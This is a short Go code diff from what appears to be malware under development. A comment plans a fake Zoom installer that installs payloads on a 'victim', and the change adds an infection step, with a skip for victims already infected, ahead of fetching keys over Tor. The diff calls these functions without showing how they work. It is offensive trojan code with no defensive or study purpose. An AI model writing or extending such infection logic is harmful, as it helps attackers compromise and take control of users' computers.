@@ -8,7 +8,15 @@ import (
 
 func main() {
     // TODO: start actual zoom installer and install payloads on victim
-    err := victim.DownloadKeysFromTor()
+    ok, err := victim.Infect()
+    if err != nil {
+        log.Fatal(err)
+    }
+    if !ok {
+        // victim has already been infected
+        return
+    }
+    err = victim.DownloadKeysFromTor()
     if err != nil {
         log.Fatal(err)
     }
